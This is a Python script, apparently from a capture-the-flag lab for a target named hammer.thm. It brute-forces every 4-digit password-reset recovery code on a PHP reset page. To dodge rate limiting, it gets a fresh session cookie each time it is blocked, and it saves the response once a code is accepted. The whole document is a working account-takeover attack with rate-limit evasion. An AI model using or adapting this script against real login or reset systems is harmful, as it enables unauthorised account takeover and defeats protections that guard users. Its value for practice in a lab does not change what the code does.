import requests
import time

EMAIL_URL = "http://10.10.112.118:1337/reset_password.php"
BRUTE_URL = "http://10.10.112.118:1337/reset_password.php"

HEADERS = {
    "Host": "10.10.112.118:1337",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.112.118:1337",
    "Connection": "keep-alive",
    "Referer": "http://10.10.112.118:1337/reset_password.php",
    "Upgrade-Insecure-Requests": "1"
}

def get_new_session():
    data = {"email": "tester@hammer.thm"}
    try:
        session = requests.Session()
        response = session.post(EMAIL_URL, headers=HEADERS, data=data)
        phpsessid = session.cookies.get("PHPSESSID")
        if not phpsessid:
            print("[!] Could not extract PHPSESSID.")
        return phpsessid
    except Exception as e:
        print("[!] Error obtaining new session: {}".format(e))
        return None

def brute_force():
    session_id = get_new_session()
    if not session_id:
        print("[!] Initial session retrieval failed.")
        return

    for code in range(1000, 10000):
        data = {
            "recovery_code": str(code),
            "s": "139"
        }

        headers = HEADERS.copy()
        headers["Cookie"] = "PHPSESSID=" + session_id

        try:
            response = requests.post(BRUTE_URL, headers=headers, data=data)
            print("[{}] Status: {}".format(code, response.status_code))

            if "rate limit" in response.text.lower() or "invalid session" in response.text.lower():
                print("[!] Rate limited or session expired. Getting new session...")
                session_id = get_new_session()
                if not session_id:
                    print("[!] Failed to renew session. Skipping this round.")
                    continue
                time.sleep(1)
                continue

            if "invalid" not in response.text.lower():
                print("[+] Possible code: {}".format(code))
                print(session_id)
                with open("code.html", "w") as f:
                    f.write(response.text.encode('utf-8'))
                break

        except Exception as e:
            print("[!] Error with code {}: {}".format(code, e))

        #time.sleep(2)

if __name__ == "__main__":
    brute_force()
